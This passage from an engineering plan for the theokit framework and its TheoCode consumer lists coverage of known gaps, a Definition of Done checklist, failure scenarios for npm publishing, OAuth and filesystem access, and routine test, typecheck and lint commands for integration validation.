| **—** | `command-template.ts` — 112 LOC of template expansion, zero framework imports (sub-item of gap 23's module, no task in v1.0) | T3.3, T5.2 | Expander ships in `@theokit/agents/config`, beside the loader that already owns the format |
| **—** | `legacyRootHint` — the consumer writes the migration notice for the framework's own layout (sub-item of the backtrack cluster) | T2.6, T5.3 | `transcriptRootHint` ships in `@theokit/agents/session` |
| **—** | Surface-side pending ledger survives because `createPendingLedger` has no payload slot | T2.7, T5.2 | Generic payload + injectable thread extractor |
| **—** | `windowAround` centred anchor + capability-derived shortcut list (~102 LOC in `components/`) | T3.4, T5.2 | Both ship in `@theokit/tui`; closes U-10's TUI half completely |
| 24 | `CLAUDE.md` names 5 siblings of 11 repos | T4.2 | Table completed or explicitly demoted |
| 25 | `@theokit/di-agent` has no local build | (deferred, low) | Filed; costs contributors, not customers |
| 26 | U-4 — `assertSecureModes` mask refuses the framework's own layout | T2.4 | Q3 answered; check and creator made to agree |
| 27 | U-10 — `readJsonlTail` returns no absolute index | T2.5 | Substring defect fixed; index deferred (Q5) |
| 29 | `listSubagentNames` shipped, consumer duplicate survives | T5.2 (adoption sweep) | Duplicate deleted during the adoption pass |
| F59 | No gate watches layer→consumer | T4.1 | The invention-reachability gate |
| F78 | Consumer register says 8 open; 0 are | T4.3, T5.4 | Closure convention + register taken to zero |
| F79 | Registry half of session deletion unreachable | T2.2 | Async remover seam on both call sites |
| F80 | `assertSecureModes` refuses an ordinary desktop | T2.4 | Same as gap 26 |
| — | `forkBeforeUserTurn` counts the wrong turns (**defect**) | T2.3, T5.3 | Boundary- and turn-aware counting + `selectedText` |

**Coverage: 26/28 addressed (93%); 2 explicitly deferred with reasons (gap 23 — needs a second consumer; gap 25 — contributor-only, low).**

Denominator: **16 registered gaps + 7 non-info findings + 1 defect + 4 named sub-items = 28.** (v1.2: gap 16 left the numerator *and* the denominator — EC-1 established it was never a gap. Removing it from only one would have inflated the percentage, which is the arithmetic this plan's own T0.1 exists to prevent.)

> **v1.1 correction to the arithmetic.** v1.0 declared 20/22 (91%). Both numbers were wrong: the denominator omitted three registered findings (F60, F63, F64), so the true v1.0 figure was 20/25 = 80%. It was caught by querying the database rather than re-reading the matrix — the same discipline the plan's own T0.1 installs for the capability index, applied to the plan itself. Recorded rather than silently rewritten, because a coverage number that moves without a stated reason is exactly the fabrication `plan-confidence-golden-rule.md` caps at INVALID.
>
> The two deferrals are declared rather than silently dropped. Gap 23 (CLI arg parsing, 470 LOC) is deferred on the same principle that made the 2026-08-15 audit decline to contort `createDelegateTool`: one consumer's shape is not evidence of a general shape. Note the distinction — gap 23's *module* (`commands/`) IS addressed via T3.3 and T5.2; what is deferred is the CLI **argument parser** in `packages/cli/src/runtime/args.ts`, a different file. Gap 25 (`@theokit/di-agent` has no local build) is low severity and costs contributors, not customers. Both are named in the final report so the next measurement does not re-derive them.
>
> **One item is deliberately excluded, with the disagreement recorded.** The surface sweep listed `SecretInput` among `components/`'s absorbable LOC. The U-9 verification measured the opposite: the consumer's 60-LOC `SecretInput` was already **deleted** when `FreeTextInputProps.mask` shipped in `@theokit/tui@0.53.0`, and the surviving 22 LOC of `secret-buffer.ts` is product policy the framework should not own. Two agents disagree; the more specific verification (which opened the installed `dist/index.d.ts:1358` and the consumer's current tree) wins, and the disagreement is written here rather than resolved silently.

## Global Definition of Done

- [ ] All phases completed.
- [ ] All tests passing — `pnpm test` green in `theokit`; `cd ../theokit-tui && pnpm test`; `cd ../theokit-sdk && pnpm test`; `cd TheoCode && npm test`.
- [ ] Zero type errors — `pnpm typecheck` in each repo.
- [ ] Zero lint warnings — `pnpm lint` (9 groups) in `theokit`.
- [ ] `pnpm check:all` green, including the two new gates in warn mode.
- [ ] `pnpm check:deps` — 0 violations.
- [ ] File-size budget respected: every changed file ≤ 500 lines (`rules/system-design-guardrails.md § G6`).
- [ ] `CHANGELOG.md` updated under `[Unreleased]` in all four repos (Unbreakable Rule 6), with `closes: U-N` where applicable (T4.3).
- [ ] Backward compatibility preserved: every signature change is a widening; no export removed from any published subpath.
- [ ] **17/17 assertions green** in `tests/integration/crossval-gaps.test.ts` — the Goal's metric. (16 close a gap; the 17th, from T1.1, pins the reachability that gap 16 wrongly denied. The count is unchanged and what it asserts is not.)
- [ ] **TheoCode deletion counted** — ≥ **1.300** LOC removed, measured by `git diff --stat` across Phase 5. (v1.1: raised from 900 — the four sub-items added here account for ~515 LOC the v1.0 target did not include. The surface sweep named ~862 absorbable across the four modules; this plan now addresses ~760 of it, leaving `interpret-command.ts` and the verb table as correctly product-owned.)
- [ ] **`BACKLOG.md` upstream register at zero open rows**, each closed with a commit as evidence.
- [ ] **Runtime-metric proof** — the liveness oracle's classification equivalence is observed on the real project tree (13.269 directories), not inferred from the fixture (T5.3).
- [ ] Re-scored weighted average recorded with unchanged weights and shown arithmetic — **whatever the number is** (R3, R4).
- [ ] Plan archived to `knowledge-base/plans/completed/` only after `/review` returns `READY_TO_MERGE` and the PR is merged.

## Failure scenarios

This plan touches external I/O in three places: the npm registry (publish/resolve), the MCP OAuth HTTP flow, and the filesystem under a search budget.

| Dependency | Failure mode | How the test reproduces it | Expected behavior |
|---|---|---|---|
| **npm registry** (HTTPS) | Stale auth token → `E401` on publish; the exact failure that stopped the 2026-08-15 run | `verify-publish-credential.mjs` already probes before the release; T5.0 additionally runs `npm view` per package | Release refuses **before** cutting a tag or editing the CHANGELOG, so no artifact claims a version the registry never received. Phase 5 does not start. |
| **npm registry** (HTTPS) | A package publishes and another does not → consumer on a mixed floor | T5.0 verifies all three resolve before any consumer edit | Phase 5 blocks; the versions are recorded, not assumed |
| **MCP OAuth endpoint** (HTTPS, T1.3) | Authorization server returns 5xx during `runPkceFlow` | Existing SDK tests mock the token endpoint; the subpath test only asserts reachability, not live network | Reachability is asserted without network; live-flow resilience is the SDK's existing concern and is **not** changed by publishing the subpath — stated so the plan does not claim resilience it did not test |
| **MCP OAuth endpoint** (HTTPS, T1.3) | Refresh token expired | Same — existing SDK coverage | Unchanged by this plan |
| **Filesystem** (T3.2 / T5.3) | Search budget exhausted mid-sweep | Fixture with more decoy directories than the budget allows | Every unresolved project is `UNDETERMINED`, never `DEAD`; the GC refuses to delete on `UNDETERMINED` |
| **Filesystem** (T3.2 / T5.3) | Project directory exists but is unreadable (EACCES) | Fixture directory with mode 0000 | `UNDETERMINED` with the reason, never `DEAD` |
| **Agent registry** (T2.2, async) | `Agent.delete` rejects after the transcript file was already unlinked | Remover stub that rejects on the Nth call | File deletion and registry failure reported as two distinct fields; the sweep continues to the remaining sessions |
| **Agent registry** (T2.2, async) | `Agent.delete` never settles | Remover returning a never-resolving Promise | Bounded by timeout; a typed error surfaces; the sweep does not hang |

## Final Phase: Integration Validation (MANDATORY)

**Objective:** validate the change in a real workload across all four repositories — not as isolated unit tests.

### Execution

```bash
# Framework
cd /home/paulo/Projetos/theo/theokit-framework/theokit
pnpm test && pnpm test:coverage && pnpm typecheck && pnpm lint && pnpm check:all

# Siblings
cd ../theokit-tui && pnpm test && pnpm typecheck
cd ../theokit-sdk && pnpm test && pnpm typecheck

# Consumer, against the PUBLISHED packages (never a workspace link — that path is what CI validates)
cd /home/paulo/Projetos/theo/usetheo-labs/TheoCode
npm install && npm test && npm run typecheck && npm run lint && npm run depcruise && npm run crossval

# The Goal's metric
cd /home/paulo/Projetos/theo/theokit-framework/theokit
pnpm vitest run tests/integration/crossval-gaps.test.ts   # MUST be 17/17

# The deletion, measured
cd /home/paulo/Projetos/theo/usetheo-labs/TheoCode
git diff --stat <phase5-base>..HEAD -- packages/    # MUST show ≥ 900 deletions
```

### Real-workload proof

Beyond the suites, two behaviours must be observed rather than asserted:

1. **The liveness oracle at real scale** — run the GC sweep on the operator's actual machine (13.269 project directories per the original measurement) and record that the framework's classification matches the local oracle's, plus the total filesystem operations against the budget. Fixture-scale agreement is not proof (Risk R5).
2. **Backtrack lands on the visible turn** — drive the TUI against a real transcript containing tool results and a `compact_boundary`, press the rewind path, and confirm the composer re-seeds with the text of the turn the user sees. This is the defect T2.3 fixes and it is silent by nature, so it must be watched, not inferred.

### Exit criteria

- Every command above exits 0 (with the known `pnpm knip` pre-existing `packages/http` config debt recorded as unchanged, not newly broken).
- 17/17 assertions green.
- ≥ 900 LOC deleted in TheoCode.
- Both real-workload behaviours observed and recorded in the implementation log.
- The re-scored weighted average recorded with its arithmetic.

If any exit criterion fails, the plan is not done. Reporting a green cycle over a failed criterion is the fabrication this plan's own gates exist to prevent.
